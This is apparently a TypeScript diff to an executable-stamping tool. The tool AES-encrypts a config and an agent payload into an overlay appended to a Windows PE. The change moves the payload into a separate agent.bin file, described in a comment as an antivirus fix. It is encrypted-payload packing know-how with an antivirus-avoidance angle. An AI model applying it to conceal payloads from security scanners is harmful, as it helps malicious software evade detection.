@@ -16,6 +16,10 @@ import * as crypto from "crypto";
 export const HDR_LEN = 24;
 export const ENV_LEN = 65; // K_B(32) + IV_PAY(16) + IV_CFG(16) + CK(1)
 
+// Overlay header flag bits (header byte 5).
+export const FLAG_TEST_MODE = 0x01; // legacy dev/TEST marker
+export const FLAG_PAYLOAD_EXTERNAL = 0x02; // payload lives in sibling agent.bin, NOT appended to the PE
+
 export function ctr(key: Buffer, iv: Buffer, data: Buffer): Buffer {
   const c = crypto.createCipheriv("aes-256-ctr", key, iv);
   return Buffer.concat([c.update(data), c.final()]);
@@ -30,10 +34,26 @@ export interface OverlayOptions {
   configText: string;
   payload: Buffer;
   payloadCipher?: Buffer; // pre-computed re-key (payloadCache.reKey) — same CTR
-  flags: number; // bit0 = TEST_MODE
+  flags: number; // bit0 = TEST_MODE, bit1 = PAYLOAD_EXTERNAL
+  /** true (Option A / AV fix): do NOT embed the payload ciphertext in the PE;
+   *  it is shipped as a sibling agent.bin (built by buildAgentBin()). The PE
+   *  keeps the envelope + config + trailer; payLen still records the cipher
+   *  length so the launcher knows what to expect from agent.bin. */
+  externalPayload?: boolean;
 }
 
-/** Assemble the overlay appended after the PE — byte-identical to make-stamp.mjs. */
+/**
+ * Encrypt the agent payload under K_B/IV_PAY. This is the byte stream written
+ * to the sibling `agent.bin` when externalPayload is set — AES-256-CTR cipher
+ * of the agent; size == agent size. Same ciphertext the old inline overlay used.
+ */
+export function buildAgentBin(opts: OverlayOptions): Buffer {
+  return opts.payloadCipher ?? ctr(opts.kb, opts.ivPay, opts.payload);
+}
+
+/** Assemble the overlay appended after the PE — byte-identical to make-stamp.mjs.
+ *  When externalPayload is set the [pay] section is OMITTED from the exe (the
+ *  bytes go to agent.bin) and the trailer's payLen still records its length. */
 export function assembleOverlay(opts: OverlayOptions): Buffer {
   const envPlain = Buffer.concat([opts.kb, opts.ivPay, opts.ivCfg]);
   let ck = 0;
@@ -45,12 +65,14 @@ export function assembleOverlay(opts: OverlayOptions): Buffer {
   );
 
   const encCfg = ctr(opts.kb, opts.ivCfg, Buffer.from(opts.configText, "utf8"));
-  const encPay = opts.payloadCipher ?? ctr(opts.kb, opts.ivPay, opts.payload);
+  const encPay = buildAgentBin(opts);
+  const external = !!opts.externalPayload;
 
+  const flags = opts.flags | (external ? FLAG_PAYLOAD_EXTERNAL : 0);
   const hdr = Buffer.alloc(HDR_LEN);
   hdr.write("VNTR", 0, "ascii");
   hdr[4] = 1; // version
-  hdr[5] = opts.flags; // bit0 = TEST_MODE
+  hdr[5] = flags;
   hdr.writeUInt32LE(ENV_LEN, 8);
   hdr.writeUInt32LE(encCfg.length, 12);
   hdr.writeUInt32LE(encPay.length, 16);
@@ -60,18 +82,25 @@ export function assembleOverlay(opts: OverlayOptions): Buffer {
   trc.writeUInt32LE(encPay.length, 4);
   trc.write("VNTZ", 8, "ascii");
 
+  if (external) {
+    // [hdr][env][cfg][trc] — the 12-byte trailer follows the config directly.
+    return Buffer.concat([hdr, envelope, encCfg, trc]);
+  }
   return Buffer.concat([hdr, envelope, encCfg, encPay, trc]);
 }
 
 /**
  * Invert the overlay: locate the trailer at EOF, decrypt the envelope with the
- * launcher's seal, then decrypt config + payload under K_B. Used by the WP6
+ * launcher's seal, then decrypt config (+ payload) under K_B. Used by the WP6
  * payload round-trip check (must equal the source payload byte-for-byte).
+ * When the overlay has FLAG_PAYLOAD_EXTERNAL the payload ciphertext must be
+ * supplied via `agentBin` (the sibling agent.bin bytes).
  */
 export function decryptOverlay(
   stamped: Buffer,
   sealKey: Buffer,
-  sealIv: Buffer
+  sealIv: Buffer,
+  agentBin?: Buffer
 ): { config: string; payload: Buffer } {
   const size = stamped.length;
   if (size < HDR_LEN + ENV_LEN + 16) throw new Error("stamped exe too small");
@@ -89,7 +118,15 @@ export function decryptOverlay(
   ) {
     throw new Error("overlay length fields out of range");
   }
-  const ovLen = HDR_LEN + ENV_LEN + cfgLen + payLen;
+  // Peek the external flag from the header (requires at least hdr+env+cfg).
+  if (size < HDR_LEN + ENV_LEN + cfgLen + 12) {
+    throw new Error("stamped exe too small for overlay");
+  }
+  const flagsOff = size - (HDR_LEN + ENV_LEN + cfgLen + 12);
+  const external = (stamped[flagsOff + 5] & FLAG_PAYLOAD_EXTERNAL) !== 0;
+
+  const bodyLen = HDR_LEN + ENV_LEN + cfgLen;
+  const ovLen = bodyLen + (external ? 0 : payLen);
   const off = size - ovLen - 12;
   if (off < 0) throw new Error("overlay offset negative");
   const ov = stamped.subarray(off, off + ovLen);
@@ -116,10 +153,24 @@ export function decryptOverlay(
     ivCfg,
     ov.subarray(HDR_LEN + ENV_LEN, HDR_LEN + ENV_LEN + cfgLen)
   ).toString("utf8");
-  const payload = ctr(
-    kb,
-    ivPay,
-    ov.subarray(HDR_LEN + ENV_LEN + cfgLen, HDR_LEN + ENV_LEN + cfgLen + payLen)
-  );
+
+  let payload: Buffer;
+  if (external) {
+    if (!agentBin) {
+      throw new Error("overlay is PAYLOAD_EXTERNAL but agentBin was not supplied");
+    }
+    if (agentBin.length !== payLen) {
+      throw new Error(
+        `agent.bin length ${agentBin.length} != payLen ${payLen}`
+      );
+    }
+    payload = ctr(kb, ivPay, agentBin);
+  } else {
+    payload = ctr(
+      kb,
+      ivPay,
+      ov.subarray(HDR_LEN + ENV_LEN + cfgLen, HDR_LEN + ENV_LEN + cfgLen + payLen)
+    );
+  }
   return { config, payload };
 }
